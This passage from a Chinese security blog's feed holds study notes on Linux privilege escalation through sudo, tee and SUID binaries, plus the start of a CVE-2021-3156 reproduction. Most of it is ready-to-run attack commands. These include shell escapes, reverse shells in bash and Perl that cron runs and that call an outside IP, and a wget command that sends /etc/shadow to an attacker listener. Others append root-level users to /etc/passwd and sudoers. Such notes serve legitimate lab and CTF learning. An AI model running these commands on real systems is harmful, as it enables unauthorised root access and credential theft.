        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;sudo git help config 	
!/bin/bash或者！&#39;sh&#39;

sudo git  -p help 
!/bin/bash

直接提升权限
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/Linux%20sudo%E6%8F%90%E6%9D%83/</id>
        <title>Linux  sudo 提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/Linux%20sudo%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;什么是sudo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是sudo&#34;&gt;#&lt;/a&gt; 什么是 SUDO ?&lt;/h2&gt;&lt;p&gt;sudo 是 linux 系统管理指令，是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具，如 halt，reboot，su 等等。这样不仅减少了 root 用户的登录 和管理时间，同样也提高了安全性。sudo 不是对 shell 的一个代替，它是面向每个命令的。&lt;br&gt;基础&lt;/p&gt;&lt;p&gt;它的特性主要有这样几点：&lt;br&gt;§ sudo 能够限制用户只在某台主机上运行某些命令。&lt;br&gt;§ sudo 提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。&lt;br&gt;§ sudo 使用时间戳文件来执行类似的 “检票” 系统。当用户调用 sudo 并且输入它的密码时，用户获得了一张存活期为 5 分钟的票（这个值可以在编译的时候改变）。&lt;br&gt;§ sudo 的配置文件是 sudoers 文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在 /etc/sudoers，属性必须为 0440。&lt;/p&gt;&lt;p&gt;在 sudo 于 1980 年前后被写出之前，一般用户管理系统的方式是利用 su 切换为超级用户。但是使用 su 的缺点之一在于必须要先告知超级用户的密码。&lt;br&gt;sudo 使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是 /etc/sudoers），即完成对该用户的授权（此时该用户称为 “sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上 “sudo”，此时 sudo 将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为 5 分钟，可在 /etc/sudoers 自定义），使用 sudo 不需要再次输入密码。&lt;br&gt;由于不需要超级用户的密码，部分 Unix 系统甚至利用 sudo 使一般用户取代超级用户作为管理帐号，例如 Ubuntu、Mac OS X 等。&lt;/p&gt;&lt;p&gt;参数说明：&lt;br&gt;・-V 显示版本编号&lt;br&gt;・-h 会显示版本编号及指令的使用方式说明&lt;br&gt;・-l 显示出自己（执行 sudo 的使用者）的权限&lt;br&gt;・-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码&lt;br&gt;・-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）&lt;br&gt;・-b 将要执行的指令放在背景执行&lt;br&gt;・-p prompt 可以更改问密码的提示语，其中 % u 会代换为使用者的帐号名称， % h 会显示主机名称&lt;br&gt;・-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）&lt;br&gt;・-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell&lt;br&gt;・-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）&lt;br&gt;・command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令&lt;/p&gt;&lt;h2 id=&#34;sudoer文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudoer文件&#34;&gt;#&lt;/a&gt; Sudoer 文件&lt;/h2&gt;&lt;p&gt;sudoers 文件主要有三部分组成：&lt;br&gt;・sudoers 的默认配置（default），主要设置 sudo 的一些缺省值&lt;br&gt;・alias（别名），主要有 Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。&lt;br&gt;・安全策略（规则定义）—— 重点。&lt;/p&gt;&lt;h3 id=&#34;基本格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本格式&#34;&gt;#&lt;/a&gt; 基本格式&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;user/group  ALL=(ALL)   ALL
• user/group:
• 表示允许哪个用户或组可以使用sudo

可以指定具体某个用户，也可以将多个用户添加到别名里

User_Alias ADMINS =chirou, panghu
ADMIN   ALL=（ALL）   ALL
# 指定系统组，在组名前面加上%
%group  ALL=（ALL）   ALL
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;第一个all&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一个all&#34;&gt;#&lt;/a&gt; 第一个 ALL：&lt;/h4&gt;&lt;p&gt;・表示允许在哪台主机登录&lt;br&gt;可以指定主机 ip 或主机名，指定的是服务端 ip，与从哪个客户端连接无关。&lt;br&gt;&lt;code&gt;user 192.168.0.2=（ALL） ALL&lt;/code&gt;&lt;/p&gt;&lt;p&gt;/etc/sudoers 文件可以共享复制到多部主机上，这样只修改一份文件，指定哪个用户可以在哪台主机使用 sudo 命令，就可以直接拷贝到其他主机上，非该主机用户不能使用 sudo, 这样就能分主机管理，互不影响。&lt;/p&gt;&lt;h4 id=&#34;第二个all&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二个all&#34;&gt;#&lt;/a&gt; 第二个 ALL：&lt;/h4&gt;&lt;p&gt;・表示能转换成哪个用户&lt;br&gt;胖虎可以在所有主机上转换成所有用户执行任何命令&lt;br&gt;&lt;code&gt;panghu ALL=(ALL) ALL&lt;/code&gt;&lt;/p&gt;&lt;h4 id=&#34;第三个all&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三个all&#34;&gt;#&lt;/a&gt; 第三个 ALL：&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;• 表示转换后能执行的命令
ALL表示所有命令，可以使用绝对路径指定某些命令
/usr/sbin/ifconfig，/bin/vim /f1

# 指定不能使用某些命令
!/bin/vim /f1

# 指定使用某些命令不需要输入密码
NOPASSWD：/usr/sbin/ifconfig

# 可以使用命令别名

NOPASSWD:命令别名
touhid ALL = (root) NOPASSWD: /usr/bin/find
说明3：上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;sudo执行流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudo执行流程&#34;&gt;#&lt;/a&gt; sudo 执行流程:&lt;/h2&gt;&lt;p&gt;1、普通用户执行 sudo 命令，会检查 /var/db/sudo 是否存在时间戳缓存&lt;br&gt;2、如果存在则不需要输入密码，否则需要输入用户与密码&lt;br&gt;3、输入密码会检查是否是该用户、是否拥有权限。&lt;br&gt;4、如果有则执行，没有则报错退出。&lt;/p&gt;&lt;h2 id=&#34;sudo-提权方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudo-提权方法&#34;&gt;#&lt;/a&gt; sudo 提权方法:&lt;/h2&gt;&lt;h3 id=&#34;使用查找命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用查找命令&#34;&gt;#&lt;/a&gt; 使用查找命令&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo find / etc / passwd -exec / bin / sh \;
sudo find / bin -name nano -exec / bin / sh \;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用vim命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用vim命令&#34;&gt;#&lt;/a&gt; 使用 Vim 命令&lt;/h3&gt;&lt;p&gt;&lt;code&gt;sudo vim -c&#39;！sh&#39;&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&#34;使用nmap命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用nmap命令&#34;&gt;#&lt;/a&gt; 使用 Nmap 命令&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo nmap-交互式
nmap&amp;gt;！sh
sh-4.1＃
注意：nmap –interactive选项在最新的nmap中不可用。
也可以
echo“ os.execute（&#39;/ bin / sh&#39;）”&amp;gt; /tmp/shell.nse &amp;amp;&amp;amp; sudo nmap --script = / tmp / shell.nse
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用man命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用man命令&#34;&gt;#&lt;/a&gt; 使用 Man 命令&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo man man
之后按！按下并按Enter
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用lessmore命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用lessmore命令&#34;&gt;#&lt;/a&gt; 使用 less/more 命令&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo less / etc / hosts
sudo more / etc / hosts
之后按！按下并按Enter
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用awk命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用awk命令&#34;&gt;#&lt;/a&gt; 使用 awk 命令&lt;/h3&gt;&lt;p&gt;&lt;code&gt;sudo awk&#39;BEGIN {system（“ / bin / sh”）}&#39;&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&#34;使用nano命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用nano命令&#34;&gt;#&lt;/a&gt; 使用 nano 命令&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;nano是使用此编辑器的文本编辑器，在您需要切换用户之后，您可以修改passwd文件并将用户添加为root特权。在/ etc / passwd中添加此行，以将用户添加为root特权。
touhid：6 bxwJfzor 
sudo nano / etc / passwd   注意： ctrl + o 是保存， ctrl +x 是退出
现在切换用户密码是：test
su touhid
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用wget命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用wget命令&#34;&gt;#&lt;/a&gt; 使用 wget 命令&lt;/h3&gt;&lt;p&gt;这种非常酷的方式要求 Web 服务器下载文件。这样我从没在任何地方见过。让我们解释一下。&lt;br&gt;在 At 客者一边。&lt;br&gt;・首先将 Target 的 /etc/passwd 文件复制到攻击者计算机。&lt;br&gt;・修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。&lt;br&gt;・仅附加此行 =&amp;gt; touhid：&lt;br&gt;・将 passwd 文件托管到使用任何 Web 服务器的主机。&lt;/p&gt;&lt;p&gt;在要提权主机方面。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo wget http://192.168.56.1:8080/passwd -O / etc / passwd
现在切换用户密码是：test
su touhid
注意：如果您要从服务器上转储文件，例如root的ssh密钥，shadow文件等。
sudo wget --post-file = / etc / shadow 192.168.56.1:8080
攻击者的设置侦听器：nc – lvp 8080
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;使用apache命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用apache命令&#34;&gt;#&lt;/a&gt; 使用 apache 命令&lt;/h3&gt;&lt;p&gt;但是，我们无法获得 Shell 和 Cant 编辑系统文件。&lt;br&gt;但是使用它 我们可以查看系统文件。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo apache2 -f / etc / shadow
输出是这样的：
Syntax error on line 1 of /etc/shadow:
Invalid command &#39;root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::&#39;, perhaps misspelled or defined by a module not included in the server configuration
可悲的是没有shell。但是我们可以现在提取root哈希，然后破解了哈希
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/Linux%20tee%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/</id>
        <title>Linux tee命令提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/Linux%20tee%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;tee命令usrbintee&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tee命令usrbintee&#34;&gt;#&lt;/a&gt; tee 命令（usr/bin/tee）&lt;/h1&gt;&lt;p&gt;这是在 DC-4 靶机上遇到的&lt;/p&gt;&lt;pre&gt;&lt;code&gt;先看以下tee的用法
####################################################################
zaq@instance-f95a3vkt:/bin$ /usr/bin/tee --help
Usage: /usr/bin/tee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.
  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit
####################################################################
把输入写入文件，如果是-a的话就会在最后新起一行追加内容
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;tee的利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tee的利用&#34;&gt;#&lt;/a&gt; tee 的利用&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;当 /bin/sh指向/bin/bash的时候(ubuntu默认这样，当前的靶机也是这样)，反弹shell用bash的话得这样弹：
* * * * * root bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/106.13.124.93/2333 0&amp;gt;&amp;amp;1&amp;quot;
这样弹shell的时候不知道为什么很慢，耐心等等
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;*/1 * * * * root perl -e &#39;use Socket;$i=&amp;quot;106.13.124.93&amp;quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;echo &amp;quot;定时计划任务&amp;quot;sudo tee -a /etc/crontab&lt;/code&gt;&lt;br&gt;值得注意的是：chmod 4777 /bin/bash 不会有这种效果 (曾经看到这个解答，我给忘了，你不用管为什么了，自己试试就好了)&lt;/p&gt;&lt;h2 id=&#34;passwd添加用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#passwd添加用户&#34;&gt;#&lt;/a&gt; passwd 添加用户&lt;/h2&gt;&lt;p&gt;前提是能够更改 test 用户的密码&lt;br&gt;&lt;code&gt;echo &amp;quot;test:x:0:0::/home/admin:/bin/bash&amp;quot; | sudo tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;sudoers文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudoers文件&#34;&gt;#&lt;/a&gt; sudoers 文件&lt;/h2&gt;&lt;p&gt;&lt;code&gt;echo &amp;quot;charles ALL=(ALL:ALL) ALL&amp;quot; | sudo tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/</id>
        <title>linux SUID 提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;简单介绍一下概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单介绍一下概念&#34;&gt;#&lt;/a&gt; 简单介绍一下概念&lt;/h1&gt;&lt;p&gt;SUID（设置用户 ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有 SUID 权限，那么就可以利用系统中的二进制文件和工具来进行 root 提权。&lt;/p&gt;&lt;p&gt;已知的可用来提权的 linux 可行性的文件列表如下：&lt;br&gt;&lt;code&gt;Nmap、Vim、find、Bash、More、Less、Nano、cp&lt;/code&gt;&lt;/p&gt;&lt;p&gt;以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
find / -perm -u=s -type f 2&amp;gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因为它们的权限中包含 &amp;quot;s&amp;quot;，并且对应的是 root 权限。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap&#34;&gt;#&lt;/a&gt; NMAP&lt;/h2&gt;&lt;p&gt;较旧版本的 Nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 在使用 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。&lt;/p&gt;&lt;p&gt;&lt;code&gt;nmap -V&lt;/code&gt;&lt;/p&gt;&lt;p&gt;交互模式可以通过执行 Nmap 参数 &amp;quot;interactive&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;code&gt;nmap --interactive&lt;/code&gt;&lt;br&gt;Nmap - 交互模式&lt;br&gt;以下命令将提供一个提升的 shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;nmap&amp;gt; !sh
sh-3.2# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提权至 Root 权限，也可以通过 Metasploit 模块对 Nmap 的二进制文件进行权限提升。&lt;br&gt;exploit/unix/local/setuid_nmap&lt;/p&gt;&lt;h2 id=&#34;find&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#find&#34;&gt;#&lt;/a&gt; Find&lt;/h2&gt;&lt;p&gt;如果 Find 命令也是以 Suid 权限运行的话，则将通过 find 执行的所有命令都会以 root 权限执行。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;touch pentestlab
find pentestlab -exec whoami \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Find 命令权限提升&lt;br&gt;大部分 Linux 操作系统都安装了 netcat，因此也可以被利用来将权限提升至 root。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过 Find 运行 Netcat，连接上去就会直接获取到一个 Root 权限的 shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;netcat 192.168.1.189 5555
id
cat /etc/shadow
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;vim&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vim&#34;&gt;#&lt;/a&gt; VIM&lt;/h2&gt;&lt;p&gt;Vim 是 Linux 环境下的一款文件编辑器。但是，如果以 SUID 运行的话，它会继承 root 用户的权限，因此可以读取系统上的所有文件。&lt;br&gt;Vim - Root 权限的 shell&lt;/p&gt;&lt;pre&gt;&lt;code&gt;vim.tiny /etc/shadow
vim.tiny
 Press ESC key
:set shell=/bin/sh
:shell
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash&#34;&gt;#&lt;/a&gt; Bash&lt;/h2&gt;&lt;p&gt;以下命令将以 root 权限打开一个 bash shell。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less&#34;&gt;#&lt;/a&gt; Less&lt;/h2&gt;&lt;p&gt;Less 和 More 都执行以用来提权。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;less /etc/passwd
!/bin/sh
more /home/pelle/myfile
!/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;cp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cp&#34;&gt;#&lt;/a&gt; cp&lt;/h2&gt;&lt;p&gt;使用 cp 覆盖 /etc/shadow&lt;/p&gt;&lt;h2 id=&#34;mv&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mv&#34;&gt;#&lt;/a&gt; mv&lt;/h2&gt;&lt;p&gt;使用 mv 覆盖 /etc/shadow 或者 /etc/sudoers&lt;/p&gt;&lt;h2 id=&#34;tcpdump&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcpdump&#34;&gt;#&lt;/a&gt; tcpdump&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;echo $&#39;id\ncat /etc/shadow&#39; &amp;gt; /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;perl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#perl&#34;&gt;#&lt;/a&gt; perl&lt;/h2&gt;&lt;p&gt;我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且 UID 设置为 0，将其添加到 /etc/passwd 文件中。&lt;br&gt;首先，使用 perl 语言生成带有盐值的密码：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;perl -le &#39;print crypt(&amp;quot;password@123&amp;quot;,&amp;quot;addedsalt&amp;quot;)&#39; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行下面这条命令，成功将 test 用户的信息加入 /etc/passwd 文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;echo &amp;quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;awk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#awk&#34;&gt;#&lt;/a&gt; awk&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;awk &#39;BEGIN{system(&amp;quot;whoami&amp;quot;)}&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/</id>
        <title>Linux sudo权限提升漏洞复现（CVE-2021-3156)</title>
        <link rel="alternate" href="http://avenue.cool/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156)/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和学习整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;linux-sudo权限提升漏洞复现cve-2021-3156&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux-sudo权限提升漏洞复现cve-2021-3156&#34;&gt;#&lt;/a&gt; Linux sudo 权限提升漏洞复现（CVE-2021-3156）&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 【原理】&lt;/h2&gt;&lt;p&gt;2021 年 01 月 27 日，RedHat 官方发布了 sudo 缓冲区 / 栈溢出漏洞的风险通告，普通用户可以通过利用此漏洞，而无需进行身份验证，成功获取 root 权限。&lt;br&gt;当 sudo 通过 - s 或 - i 命令行选项在 shell 模式下运行命令时。它将在命令参数中使用反斜杠转义特殊字符。但使用 - s 或 - i 标志运行 sudoedit 时。实际上并未进行转义，从而可能导致缓冲区溢出。只要存在 sudoers 文件 (通常是 /etc/sudoers。攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。&lt;/p&gt;&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 【工具】&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;poc&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 【环境搭建】&lt;/h2&gt;&lt;p&gt;docker 搜索 ubuntu 镜像： &lt;code&gt;docker search ubuntu:20.04&lt;/code&gt;&lt;br&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;然后拉取这个看起来很厉害的镜像 (Full Deskdop!)：&lt;br&gt;&lt;code&gt;docker pull manishfoodtechs/xfcefulldesktop_ubuntu20.4&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;检测方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检测方法&#34;&gt;#&lt;/a&gt; [检测方法]：&lt;/h2&gt;&lt;p&gt;以非 root 用户登录系统，并运行如下命令：&lt;/p&gt;&lt;p&gt;sudoedit -s /&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;如果响应一个以 sudoedit: 开头的报错，那么表明存在漏洞。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;如果响应一个以 usage: 开头的报错，那么表明补丁已经生效。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 【漏洞复现】&lt;/h2&gt;&lt;p&gt;我们直接运行容器就行，进入容器的命令行&lt;br&gt;&lt;code&gt;docker run -it manishfoodtechs/xfcefulldesktop_ubuntu20.4 /bin/bash&lt;/code&gt;&lt;br&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;此时，我们创建一个普通的用户 &lt;code&gt;test&lt;/code&gt; ，切换到普通的用户&lt;/p&gt;&lt;pre&gt;&lt;code&gt;useradd test
passwd  test
su  test
cd /tmp
id
whoami
cat  /etc/shadow

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;本地开一个 pyweb，把 poc 用 wget 下载到这个容器里:&lt;/p&gt;&lt;p&gt;&lt;code&gt;python3 -m http.server 8000&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;wget http://192.168.11.1/CVE-2021-3156_nss_poc_ubuntu.tar.gz&lt;/code&gt;&lt;/p&gt;&lt;p&gt;然后解压 poc，切换到目录下 make 编译 poc:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz
cd CVE-2021-3156
make
